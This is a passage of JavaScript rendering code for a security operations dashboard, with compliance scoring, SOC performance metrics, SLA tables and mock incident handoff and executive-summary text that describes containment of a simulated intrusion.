              '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Priority</label>' +
              '<select class="ct-sel" style="width:100%">' +
                '<option>Critical - Active threat suspected</option>' +
                '<option>High - Likely gap in detection</option>' +
                '<option>Medium - Periodic check recommended</option>' +
                '<option>Low - Exploratory / research</option>' +
              '</select>' +
            '</div>' +
          '</div>' +
          '<div style="margin-bottom:10px">' +
            '<label style="font-size:.62rem;color:var(--mut);text-transform:uppercase;display:block;margin-bottom:4px">Hunt Query</label>' +
            '<textarea class="ct-textarea" placeholder="index=windows EventCode=4688 ...\n| stats count by ..." style="min-height:80px;font-family:inherit"></textarea>' +
          '</div>' +
          '<div style="display:flex;gap:8px">' +
            '<button class="ct-btn">Create Hypothesis</button>' +
            '<button class="ct-btn ct-btn-ghost">Run Query</button>' +
          '</div>' +
        '</div>' +
      '</div>';

    c.querySelectorAll('[data-hf]').forEach(function(btn) {
      btn.onclick = function() {
        huntFilter = btn.dataset.hf;
        renderHunt(c);
      };
    });
  }

  // ========== COMPLIANCE ==========
  function renderComplianceTab(c) {
    var fw = COMPLIANCE[complianceFramework];
    if (!fw) { c.innerHTML = '<div class="ct-panel"><div class="ct-panel-b">Framework not found</div></div>'; return; }

    var totalControls = 0, passCount = 0, partialCount = 0, failCount = 0, totalScore = 0;
    fw.categories.forEach(function(cat) {
      cat.controls.forEach(function(ctrl) {
        totalControls++;
        totalScore += ctrl.score;
        if (ctrl.status === 'pass') passCount++;
        else if (ctrl.status === 'partial') partialCount++;
        else failCount++;
      });
    });
    var avgScore = Math.round(totalScore / totalControls);

    c.innerHTML =
      '<div class="ct-compliance-bar" style="margin-bottom:12px">' +
        '<button class="ct-compliance-btn' + (complianceFramework==='nist_csf'?' on':'') + '" data-fw="nist_csf">NIST CSF 2.0</button>' +
        '<button class="ct-compliance-btn' + (complianceFramework==='cis_controls'?' on':'') + '" data-fw="cis_controls">CIS Controls v8</button>' +
        '<button class="ct-compliance-btn' + (complianceFramework==='soc2'?' on':'') + '" data-fw="soc2">SOC 2 Type II</button>' +
      '</div>' +

      '<div class="ct-grid4" style="margin-bottom:12px">' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:var(--acc)">' + avgScore + '<span style="font-size:.6rem">%</span></div><div class="ct-stat-l">Overall Score</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + passCount + '</div><div class="ct-stat-l">Passing</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ffd600">' + partialCount + '</div><div class="ct-stat-l">Partial</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">' + failCount + '</div><div class="ct-stat-l">Failing</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v">' + totalControls + '</div><div class="ct-stat-l">Total Controls</div></div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-bottom:12px">' +
        '<div class="ct-panel-h">' + esc(fw.name) + ' - Compliance Overview</div>' +
        '<div class="ct-panel-b">' +
          '<div style="display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap">' +
            fw.categories.map(function(cat) {
              var catPass = cat.controls.filter(function(c2){return c2.status==='pass'}).length;
              var catTotal = cat.controls.length;
              var catPct = Math.round(catPass / catTotal * 100);
              return '<div class="ct-stat" style="min-width:120px">' +
                '<div style="font-size:.62rem;color:var(--acc);font-weight:600">' + esc(cat.id) + '</div>' +
                '<div style="font-size:.68rem;margin-top:2px">' + esc(cat.name) + '</div>' +
                '<div class="ct-gauge" style="margin-top:6px"><div class="ct-gauge-fill" style="width:' + catPct + '%;background:' + (catPct>=80?'#00e676':catPct>=60?'#ffd600':'#ff1744') + '"></div></div>' +
                '<div style="font-size:.6rem;color:var(--mut);margin-top:2px">' + catPass + '/' + catTotal + ' passing</div>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +
      '</div>' +

      fw.categories.map(function(cat) {
        return '<div class="ct-panel" style="margin-bottom:8px">' +
          '<div class="ct-panel-h">' + esc(cat.id) + ' - ' + esc(cat.name) + '</div>' +
          '<div class="ct-panel-b">' +
            '<table class="ct-tbl">' +
              '<thead><tr><th>Control</th><th>Name</th><th>Status</th><th>Score</th><th>Detail</th></tr></thead>' +
              '<tbody>' +
                cat.controls.map(function(ctrl) {
                  var statusBadge = ctrl.status==='pass'?'ct-low':ctrl.status==='partial'?'ct-med':'ct-crit';
                  var statusLabel = ctrl.status==='pass'?'PASS':ctrl.status==='partial'?'PARTIAL':'FAIL';
                  return '<tr>' +
                    '<td style="color:var(--acc);font-size:.62rem;font-weight:600">' + esc(ctrl.id) + '</td>' +
                    '<td style="font-size:.68rem">' + esc(ctrl.name) + '</td>' +
                    '<td><span class="ct-badge ' + statusBadge + '">' + statusLabel + '</span></td>' +
                    '<td>' +
                      '<div class="ct-gauge" style="width:60px;display:inline-block;vertical-align:middle;margin-right:6px"><div class="ct-gauge-fill" style="width:' + ctrl.score + '%;background:' + (ctrl.score>=80?'#00e676':ctrl.score>=60?'#ffd600':'#ff1744') + '"></div></div>' +
                      '<span style="font-size:.62rem;font-weight:600">' + ctrl.score + '%</span>' +
                    '</td>' +
                    '<td style="font-size:.62rem;color:var(--mut)">' + esc(ctrl.detail) + '</td>' +
                  '</tr>';
                }).join('') +
              '</tbody>' +
            '</table>' +
          '</div>' +
        '</div>';
      }).join('') +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h" style="color:#ff1744">Gap Analysis - Failing & Partial Controls</div>' +
        '<div class="ct-panel-b">' +
          (function() {
            var gaps = [];
            fw.categories.forEach(function(cat) {
              cat.controls.forEach(function(ctrl) {
                if (ctrl.status !== 'pass') {
                  gaps.push({cat:cat.id+' '+cat.name,id:ctrl.id,name:ctrl.name,status:ctrl.status,score:ctrl.score,detail:ctrl.detail});
                }
              });
            });
            if (gaps.length === 0) return '<div style="font-size:.72rem;color:#00e676;text-align:center;padding:20px">All controls passing</div>';
            return '<table class="ct-tbl">' +
              '<thead><tr><th>Category</th><th>Control</th><th>Status</th><th>Score</th><th>Gap Detail</th><th>Remediation Priority</th></tr></thead>' +
              '<tbody>' +
              gaps.map(function(g) {
                var priority = g.score < 50 ? 'P1 - Immediate' : g.score < 70 ? 'P2 - 30 Days' : 'P3 - 90 Days';
                var prioColor = g.score < 50 ? '#ff1744' : g.score < 70 ? '#ff9100' : '#ffd600';
                return '<tr>' +
                  '<td style="font-size:.62rem;color:var(--mut)">' + esc(g.cat) + '</td>' +
                  '<td style="font-size:.62rem"><span style="color:var(--acc)">' + esc(g.id) + '</span> ' + esc(g.name) + '</td>' +
                  '<td><span class="ct-badge ' + (g.status==='fail'?'ct-crit':'ct-med') + '">' + g.status.toUpperCase() + '</span></td>' +
                  '<td style="font-weight:600;color:' + (g.score<50?'#ff1744':g.score<70?'#ff9100':'#ffd600') + '">' + g.score + '%</td>' +
                  '<td style="font-size:.6rem;color:var(--mut)">' + esc(g.detail) + '</td>' +
                  '<td style="font-size:.62rem;font-weight:600;color:' + prioColor + '">' + priority + '</td>' +
                '</tr>';
              }).join('') +
              '</tbody></table>';
          })() +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Remediation Roadmap</div>' +
        '<div class="ct-panel-b">' +
          [
            {phase:'Phase 1: Critical Fixes (0-30 days)',items:['Apply CIS benchmarks to cloud workloads (CIS 4.1, NIST PR.PS-01)','Complete app control policy enforcement on all endpoints (CIS 2.3)','Automate data retention enforcement (CIS 3.4)'],color:'#ff1744'},
            {phase:'Phase 2: High Priority (30-60 days)',items:['Improve third-party risk assessment process (NIST GV.SC-01)','Document regulatory notification procedures (NIST RS.MA-03)','Increase vendor assessment frequency (SOC2 CC9.2)','Implement internal network flow logging (CIS 13.6)'],color:'#ff9100'},
            {phase:'Phase 3: Improvement (60-90 days)',items:['Test stakeholder communication plan (NIST RC.CO-01)','Improve risk prioritization consistency (NIST ID.RA-05)','Encrypt remaining file shares (NIST PR.DS-01)','Conduct tabletop exercises for incident response (SOC2 CC7.4)'],color:'#ffd600'},
          ].map(function(p) {
            return '<div style="margin-bottom:12px">' +
              '<div style="font-size:.72rem;font-weight:600;color:' + p.color + ';margin-bottom:6px;padding-bottom:4px;border-bottom:2px solid ' + p.color + '">' + esc(p.phase) + '</div>' +
              p.items.map(function(item) {
                return '<div style="display:flex;align-items:center;gap:8px;padding:4px 0;font-size:.65rem">' +
                  '<span style="width:14px;height:14px;border:1px solid var(--line);border-radius:2px;flex-shrink:0"></span>' +
                  '<span>' + esc(item) + '</span>' +
                '</div>';
              }).join('') +
            '</div>';
          }).join('') +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Compliance Trend (Last 6 Months)</div>' +
        '<div class="ct-panel-b">' +
          '<table class="ct-tbl">' +
            '<thead><tr><th>Month</th><th>Overall Score</th><th>Passing</th><th>Partial</th><th>Failing</th><th>Change</th></tr></thead>' +
            '<tbody>' +
              [
                {month:'Apr 2026',score:68,pass:18,partial:8,fail:4,change:'+3'},
                {month:'May 2026',score:71,pass:19,partial:8,fail:3,change:'+3'},
                {month:'Jun 2026',score:74,pass:21,partial:7,fail:2,change:'+3'},
                {month:'Jul 2026',score:76,pass:22,partial:6,fail:2,change:'+2'},
                {month:'Aug 2026',score:79,pass:23,partial:6,fail:1,change:'+3'},
                {month:'Sep 2026',score:avgScore,pass:passCount,partial:partialCount,fail:failCount,change:'+' + (avgScore - 79)},
              ].map(function(m) {
                return '<tr>' +
                  '<td style="font-weight:600">' + esc(m.month) + '</td>' +
                  '<td style="color:' + (m.score>=80?'#00e676':m.score>=70?'#ffd600':'#ff9100') + ';font-weight:600">' + m.score + '%</td>' +
                  '<td style="color:#00e676">' + m.pass + '</td>' +
                  '<td style="color:#ffd600">' + m.partial + '</td>' +
                  '<td style="color:#ff1744">' + m.fail + '</td>' +
                  '<td style="color:#00e676;font-weight:600">' + m.change + '</td>' +
                '</tr>';
              }).join('') +
            '</tbody>' +
          '</table>' +
        '</div>' +
      '</div>' +

      '<div style="display:flex;gap:8px;margin-top:12px">' +
        '<button class="ct-btn">Generate Compliance Report</button>' +
        '<button class="ct-btn ct-btn-ghost">Export CSV</button>' +
        '<button class="ct-btn ct-btn-ghost">Schedule Assessment</button>' +
      '</div>';

    c.querySelectorAll('.ct-compliance-btn').forEach(function(btn) {
      btn.onclick = function() {
        complianceFramework = btn.dataset.fw;
        renderComplianceTab(c);
      };
    });
  }

  // ========== METRICS ==========
  function renderMetrics(c) {
    var m = SOC_METRICS;
    var maxAlert = Math.max.apply(null, m.alertVolume.week);
    var maxMttd = Math.max.apply(null, m.mttd.trend);
    var maxMttr = Math.max.apply(null, m.mttr.trend);
    var maxFp = Math.max.apply(null, m.falsePositiveRate.trend);
    var days = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];

    c.innerHTML =
      '<div class="ct-grid4" style="margin-bottom:12px">' +
        '<div class="ct-stat">' +
          '<div class="ct-stat-v" style="color:' + (m.mttd.current<=m.mttd.target?'#00e676':'#ff9100') + '">' + m.mttd.current + '<span style="font-size:.6rem">min</span></div>' +
          '<div class="ct-stat-l">MTTD (Target: ' + m.mttd.target + 'min)</div>' +
        '</div>' +
        '<div class="ct-stat">' +
          '<div class="ct-stat-v" style="color:' + (m.mttr.current<=m.mttr.target?'#00e676':'#ff9100') + '">' + m.mttr.current + '<span style="font-size:.6rem">min</span></div>' +
          '<div class="ct-stat-l">MTTR (Target: ' + m.mttr.target + 'min)</div>' +
        '</div>' +
        '<div class="ct-stat">' +
          '<div class="ct-stat-v" style="color:' + (m.falsePositiveRate.current<=m.falsePositiveRate.target?'#00e676':'#ff9100') + '">' + m.falsePositiveRate.current + '<span style="font-size:.6rem">%</span></div>' +
          '<div class="ct-stat-l">FP Rate (Target: ' + m.falsePositiveRate.target + '%)</div>' +
        '</div>' +
        '<div class="ct-stat"><div class="ct-stat-v">' + m.alertVolume.today + '</div><div class="ct-stat-l">Alerts Today</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#00e676">' + m.closedToday + '</div><div class="ct-stat-l">Closed Today</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff9100">' + m.openAlerts + '</div><div class="ct-stat-l">Open Alerts</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v" style="color:#ff1744">' + m.criticalOpen + '</div><div class="ct-stat-l">Critical Open</div></div>' +
        '<div class="ct-stat"><div class="ct-stat-v">' + m.escalationRate.current + '<span style="font-size:.6rem">%</span></div><div class="ct-stat-l">Escalation Rate</div></div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-bottom:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Alert Volume Trend (7 days)</div>' +
          '<div class="ct-panel-b">' +
            '<div class="ct-trend" style="height:100px">' +
              m.alertVolume.week.map(function(v,i) {
                var h = Math.round((v/maxAlert)*100);
                return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
                  '<div style="font-size:.55rem;color:var(--mut)">' + v + '</div>' +
                  '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%"></div></div>' +
                  '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
          '</div>' +
        '</div>' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">MTTD Trend (7 days)</div>' +
          '<div class="ct-panel-b">' +
            '<div class="ct-trend" style="height:100px">' +
              m.mttd.trend.map(function(v,i) {
                var h = Math.round((v/maxMttd)*100);
                return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
                  '<div style="font-size:.55rem;color:var(--mut)">' + v + 'm</div>' +
                  '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%;background:' + (v<=m.mttd.target?'#00e676':'#ff9100') + '"></div></div>' +
                  '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
            '<div style="margin-top:4px;font-size:.55rem;color:var(--mut)">Target: ' + m.mttd.target + ' min</div>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-bottom:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">MTTR Trend (7 days)</div>' +
          '<div class="ct-panel-b">' +
            '<div class="ct-trend" style="height:100px">' +
              m.mttr.trend.map(function(v,i) {
                var h = Math.round((v/maxMttr)*100);
                return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
                  '<div style="font-size:.55rem;color:var(--mut)">' + v + 'm</div>' +
                  '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%;background:' + (v<=m.mttr.target?'#00e676':'#ff9100') + '"></div></div>' +
                  '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
            '<div style="margin-top:4px;font-size:.55rem;color:var(--mut)">Target: ' + m.mttr.target + ' min</div>' +
          '</div>' +
        '</div>' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">False Positive Rate Trend (7 days)</div>' +
          '<div class="ct-panel-b">' +
            '<div class="ct-trend" style="height:100px">' +
              m.falsePositiveRate.trend.map(function(v,i) {
                var h = Math.round((v/maxFp)*100);
                return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;gap:2px">' +
                  '<div style="font-size:.55rem;color:var(--mut)">' + v + '%</div>' +
                  '<div style="flex:1;width:100%;display:flex;align-items:flex-end"><div class="ct-trend-bar" style="height:' + h + '%;width:100%;background:' + (v<=m.falsePositiveRate.target?'#00e676':'#ff9100') + '"></div></div>' +
                  '<div style="font-size:.5rem;color:var(--mut)">' + days[i] + '</div>' +
                '</div>';
              }).join('') +
            '</div>' +
            '<div style="margin-top:4px;font-size:.55rem;color:var(--mut)">Target: ' + m.falsePositiveRate.target + '%</div>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-bottom:12px">' +
        '<div class="ct-panel-h">Analyst Performance</div>' +
        '<div class="ct-panel-b">' +
          '<table class="ct-tbl">' +
            '<thead><tr><th>Analyst</th><th>Open</th><th>Closed (24h)</th><th>Avg Resolution</th><th>Workload</th></tr></thead>' +
            '<tbody>' +
              m.analystLoad.map(function(a) {
                var loadPct = Math.round(a.open / 30 * 100);
                return '<tr>' +
                  '<td><div style="display:flex;align-items:center;gap:6px"><div class="ct-analyst-avatar" style="width:22px;height:22px;font-size:.55rem">' + a.name.charAt(a.name.length-1) + '</div>' + esc(a.name) + '</div></td>' +
                  '<td style="font-weight:600;color:' + (a.open>20?'#ff1744':a.open>15?'#ff9100':'var(--txt)') + '">' + a.open + '</td>' +
                  '<td style="color:#00e676;font-weight:600">' + a.closed + '</td>' +
                  '<td>' + a.avgTime + ' min</td>' +
                  '<td><div class="ct-gauge" style="width:80px;display:inline-block;vertical-align:middle;margin-right:4px"><div class="ct-gauge-fill" style="width:' + Math.min(100,loadPct) + '%;background:' + (loadPct>75?'#ff1744':loadPct>50?'#ff9100':'#00e676') + '"></div></div><span style="font-size:.6rem">' + loadPct + '%</span></td>' +
                '</tr>';
              }).join('') +
            '</tbody>' +
          '</table>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel">' +
        '<div class="ct-panel-h">Shift Handoff Report</div>' +
        '<div class="ct-panel-b">' +
          m.shifts.map(function(s) {
            return '<div style="display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid var(--line);font-size:.68rem">' +
              '<div style="min-width:160px;font-weight:600">' + esc(s.shift) + '</div>' +
              '<div style="min-width:100px">Lead: <span style="color:var(--acc)">' + esc(s.lead) + '</span></div>' +
              '<div style="flex:1;color:var(--mut)">Team: ' + s.analysts.join(', ') + '</div>' +
              '<div style="font-weight:600">' + s.alerts + ' alerts processed</div>' +
            '</div>';
          }).join('') +
          '<div style="margin-top:12px">' +
            '<div style="font-size:.62rem;color:var(--mut);text-transform:uppercase;margin-bottom:6px">Handoff Notes</div>' +
            '<div class="ct-yaml">' +
              'SHIFT HANDOFF - Day to Swing\n' +
              '================================\n' +
              'Active Incidents:\n' +
              '  - INC-2026-0921-001: Cobalt Strike C2 detected on WS-JSMITH-01\n' +
              '    Status: Investigating | Analyst-1 leading\n' +
              '    Host isolated, forensic image in progress\n' +
              '  - INC-2026-0921-002: Data exfiltration attempt from 10.0.2.100\n' +
              '    Status: Escalated to IR | 450MB transferred before block\n' +
              '    Outbound traffic blocked, evidence preserved\n\n' +
              'Pending Items:\n' +
              '  - 15 New alerts in queue (3 Critical)\n' +
              '  - AWS IAM backdoor user needs remediation\n' +
              '  - S3 bucket policy reverted, confirm with cloud team\n\n' +
              'Notes:\n' +
              '  - Threat actor IP 198.51.100.50 added to block list\n' +
              '  - Password reset forced for compromised svc-admin account\n' +
              '  - EDR signatures updated for Cobalt Strike variant' +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">SLA Performance</div>' +
        '<div class="ct-panel-b">' +
          '<table class="ct-tbl">' +
            '<thead><tr><th>SLA Metric</th><th>Target</th><th>Current</th><th>Status</th><th>30-Day Avg</th><th>Trend</th></tr></thead>' +
            '<tbody>' +
              [
                {metric:'Critical Alert Response',target:'5 min',current:'4.2 min',status:'pass',avg:'4.8 min',trend:'down'},
                {metric:'High Alert Response',target:'15 min',current:'12.1 min',status:'pass',avg:'13.5 min',trend:'down'},
                {metric:'Medium Alert Response',target:'60 min',current:'42.3 min',status:'pass',avg:'48.1 min',trend:'down'},
                {metric:'Mean Time to Detect',target:'10 min',current:'12.0 min',status:'fail',avg:'13.2 min',trend:'down'},
                {metric:'Mean Time to Respond',target:'30 min',current:'45.0 min',status:'fail',avg:'48.5 min',trend:'down'},
                {metric:'False Positive Rate',target:'15%',current:'18%',status:'fail',avg:'20.1%',trend:'down'},
                {metric:'Alert Closure Rate (24h)',target:'85%',current:'69.7%',status:'fail',avg:'72.3%',trend:'up'},
                {metric:'Escalation Rate',target:'5%',current:'8%',status:'fail',avg:'7.2%',trend:'up'},
                {metric:'Coverage Hours',target:'24/7',current:'24/7',status:'pass',avg:'24/7',trend:'flat'},
                {metric:'Incident Report Time',target:'4 hours',current:'3.5 hours',status:'pass',avg:'3.8 hours',trend:'down'},
              ].map(function(s) {
                var trendIcon = s.trend==='down'?'v':s.trend==='up'?'^':'-';
                var trendColor = (s.status==='pass' && s.trend==='down') || (s.status==='fail' && s.trend==='down') ? '#00e676' : s.trend==='up' ? '#ff9100' : 'var(--mut)';
                return '<tr>' +
                  '<td style="font-weight:600">' + esc(s.metric) + '</td>' +
                  '<td style="color:var(--mut)">' + esc(s.target) + '</td>' +
                  '<td style="font-weight:600">' + esc(s.current) + '</td>' +
                  '<td><span class="ct-badge ' + (s.status==='pass'?'ct-low':'ct-high') + '">' + (s.status==='pass'?'MET':'MISS') + '</span></td>' +
                  '<td style="color:var(--mut)">' + esc(s.avg) + '</td>' +
                  '<td style="color:' + trendColor + ';font-weight:600;font-size:1rem">' + trendIcon + '</td>' +
                '</tr>';
              }).join('') +
            '</tbody>' +
          '</table>' +
        '</div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-top:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Alert Category Breakdown</div>' +
          '<div class="ct-panel-b">' +
            [
              {cat:'Credential Access',count:45,pct:16,color:'#ff1744'},
              {cat:'Execution',count:38,pct:13,color:'#ff9100'},
              {cat:'Initial Access',count:35,pct:12,color:'#ffd600'},
              {cat:'Lateral Movement',count:32,pct:11,color:'#00e676'},
              {cat:'Command & Control',count:28,pct:10,color:'#00e5ff'},
              {cat:'Persistence',count:25,pct:9,color:'#7c4dff'},
              {cat:'Defense Evasion',count:22,pct:8,color:'#e040fb'},
              {cat:'Exfiltration',count:18,pct:6,color:'#ff6e40'},
              {cat:'Discovery',count:15,pct:5,color:'#69f0ae'},
              {cat:'Collection',count:12,pct:4,color:'#40c4ff'},
              {cat:'Other',count:14,pct:5,color:'var(--mut)'},
            ].map(function(c2) {
              return '<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px;font-size:.62rem">' +
                '<span style="min-width:110px;color:var(--mut)">' + esc(c2.cat) + '</span>' +
                '<div class="ct-gauge" style="flex:1"><div class="ct-gauge-fill" style="width:' + c2.pct*4 + '%;background:' + c2.color + '"></div></div>' +
                '<span style="min-width:35px;text-align:right;font-weight:600">' + c2.count + '</span>' +
                '<span style="min-width:25px;text-align:right;color:var(--mut)">' + c2.pct + '%</span>' +
              '</div>';
            }).join('') +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Top Targeted Assets</div>' +
          '<div class="ct-panel-b">' +
            '<table class="ct-tbl">' +
              '<thead><tr><th>Asset</th><th>Type</th><th>Alerts</th><th>Critical</th><th>Risk Score</th></tr></thead>' +
              '<tbody>' +
                [
                  {asset:'10.0.2.100 (WS-JSMITH-01)',type:'Workstation',alerts:45,crit:8,risk:95},
                  {asset:'DC-01.corp.local',type:'Domain Controller',alerts:28,crit:5,risk:92},
                  {asset:'FS-01.corp.local',type:'File Server',alerts:15,crit:2,risk:78},
                  {asset:'10.0.1.20 (web-prod-01)',type:'Web Server',alerts:12,crit:1,risk:65},
                  {asset:'AWS Account (prod)',type:'Cloud',alerts:8,crit:3,risk:88},
                  {asset:'10.0.2.150',type:'Workstation',alerts:5,crit:1,risk:72},
                  {asset:'10.0.3.75',type:'Workstation',alerts:4,crit:0,risk:35},
                  {asset:'k8s-master',type:'Container',alerts:3,crit:0,risk:42},
                ].map(function(a) {
                  return '<tr>' +
                    '<td style="font-size:.62rem;font-weight:600">' + esc(a.asset) + '</td>' +
                    '<td><span class="ct-tag">' + esc(a.type) + '</span></td>' +
                    '<td style="font-weight:600">' + a.alerts + '</td>' +
                    '<td style="color:#ff1744;font-weight:600">' + a.crit + '</td>' +
                    '<td><div class="ct-gauge" style="width:60px;display:inline-block;vertical-align:middle;margin-right:4px"><div class="ct-gauge-fill" style="width:' + a.risk + '%;background:' + (a.risk>=80?'#ff1744':a.risk>=60?'#ff9100':'#ffd600') + '"></div></div><span style="font-size:.6rem;font-weight:600;color:' + (a.risk>=80?'#ff1744':a.risk>=60?'#ff9100':'#ffd600') + '">' + a.risk + '</span></td>' +
                  '</tr>';
                }).join('') +
              '</tbody>' +
            '</table>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-panel" style="margin-top:12px">' +
        '<div class="ct-panel-h">Executive Summary Report</div>' +
        '<div class="ct-panel-b">' +
          '<div class="ct-yaml">' +
            'SOC EXECUTIVE SUMMARY - ' + new Date().toISOString().split('T')[0] + '\n' +
            '========================================================\n\n' +
            'THREAT LANDSCAPE:\n' +
            '  Active Incidents: 4 (3 Critical, 1 High)\n' +
            '  Primary Threat: Advanced persistent attacker leveraging\n' +
            '    Cobalt Strike for C2, lateral movement via pass-the-hash,\n' +
            '    credential dumping with Mimikatz, data exfiltration (450MB)\n' +
            '  Attack Attribution: TTP alignment with APT29 (Cozy Bear)\n' +
            '  Dwell Time: Estimated 45 minutes (08:01 - 08:45)\n\n' +
            'SOC PERFORMANCE:\n' +
            '  Alerts Processed (24h): ' + m.alertVolume.today + '\n' +
            '  Critical/High Alerts: ' + ALERTS.filter(function(a){return a.severity==='Critical'||a.severity==='High'}).length + '\n' +
            '  Mean Time to Detect: ' + m.mttd.current + ' min (target: ' + m.mttd.target + ' min)\n' +
            '  Mean Time to Respond: ' + m.mttr.current + ' min (target: ' + m.mttr.target + ' min)\n' +
            '  False Positive Rate: ' + m.falsePositiveRate.current + '% (target: ' + m.falsePositiveRate.target + '%)\n\n' +
            'CONTAINMENT ACTIONS TAKEN:\n' +
            '  [X] WS-JSMITH-01 isolated from network\n' +
            '  [X] C2 IP 45.33.32.156 blocked at perimeter\n' +
            '  [X] Exfil destination 198.51.100.50 blocked\n' +
            '  [X] Compromised svc-admin password reset\n' +
            '  [X] Audit log backup verified and restored\n' +
            '  [ ] AWS backdoor user deletion (pending)\n' +
            '  [ ] S3 bucket policy audit (pending)\n' +
            '  [ ] Full forensic analysis (in progress)\n\n' +
            'RECOMMENDATIONS:\n' +
            '  1. Enforce MFA for all service accounts\n' +
            '  2. Implement LAPS for local admin passwords\n' +
            '  3. Deploy application whitelisting on DCs\n' +
            '  4. Review and restrict PowerShell execution policies\n' +
            '  5. Enable advanced audit logging on all DCs\n' +
            '  6. Conduct tabletop exercise for IR team' +
          '</div>' +
          '<div style="display:flex;gap:8px;margin-top:10px">' +
            '<button class="ct-btn">Export PDF</button>' +
            '<button class="ct-btn ct-btn-ghost">Email to Management</button>' +
            '<button class="ct-btn ct-btn-ghost">Schedule Auto-Report</button>' +
          '</div>' +
        '</div>' +
      '</div>' +

      '<div class="ct-grid2" style="margin-top:12px">' +
        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Incident Response Metrics</div>' +
          '<div class="ct-panel-b">' +
            '<table class="ct-tbl">' +
              '<thead><tr><th>Metric</th><th>This Week</th><th>Last Week</th><th>Change</th></tr></thead>' +
              '<tbody>' +
                [
                  {metric:'Total Incidents',curr:8,prev:5,good:'down'},
                  {metric:'Critical Incidents',curr:4,prev:2,good:'down'},
                  {metric:'Avg Containment Time',curr:'42 min',prev:'55 min',good:'down'},
                  {metric:'Avg Recovery Time',curr:'4.2 hrs',prev:'6.8 hrs',good:'down'},
                  {metric:'Incidents from Hunts',curr:3,prev:1,good:'up'},
                  {metric:'Repeat Incidents',curr:1,prev:3,good:'down'},
                  {metric:'External Reports Filed',curr:2,prev:0,good:'NA'},
                  {metric:'Lessons Learned Done',curr:3,prev:4,good:'up'},
                ].map(function(m) {
                  var currVal = typeof m.curr === 'number' ? m.curr : m.curr;
                  var prevVal = typeof m.prev === 'number' ? m.prev : m.prev;
                  var diff = typeof m.curr === 'number' && typeof m.prev === 'number' ? m.curr - m.prev : null;
                  var changeColor = diff === null ? 'var(--mut)' : (diff > 0 && m.good === 'down') || (diff < 0 && m.good === 'up') ? '#ff1744' : (diff < 0 && m.good === 'down') || (diff > 0 && m.good === 'up') ? '#00e676' : 'var(--mut)';
                  var changeText = diff === null ? '--' : (diff > 0 ? '+' : '') + diff;
                  return '<tr>' +
                    '<td style="font-weight:600">' + esc(m.metric) + '</td>' +
                    '<td>' + currVal + '</td>' +
                    '<td style="color:var(--mut)">' + prevVal + '</td>' +
                    '<td style="color:' + changeColor + ';font-weight:600">' + changeText + '</td>' +
                  '</tr>';
                }).join('') +
              '</tbody>' +
            '</table>' +
          '</div>' +
        '</div>' +

        '<div class="ct-panel">' +
          '<div class="ct-panel-h">Risk Score by Business Unit</div>' +
          '<div class="ct-panel-b">' +
            [
              {unit:'Finance',score:82,trend:'up',alerts:34,critAssets:5},
              {unit:'Engineering',score:45,trend:'down',alerts:89,critAssets:12},
              {unit:'Human Resources',score:68,trend:'up',alerts:18,critAssets:3},
              {unit:'Executive',score:71,trend:'stable',alerts:8,critAssets:2},
              {unit:'Sales',score:38,trend:'down',alerts:15,critAssets:1},
              {unit:'IT Operations',score:55,trend:'down',alerts:62,critAssets:8},
              {unit:'Legal/Compliance',score:25,trend:'down',alerts:5,critAssets:1},
              {unit:'Marketing',score:18,trend:'stable',alerts:3,critAssets:0},
            ].map(function(bu) {
              var riskColor = bu.score>=70?'#ff1744':bu.score>=50?'#ff9100':bu.score>=30?'#ffd600':'#00e676';
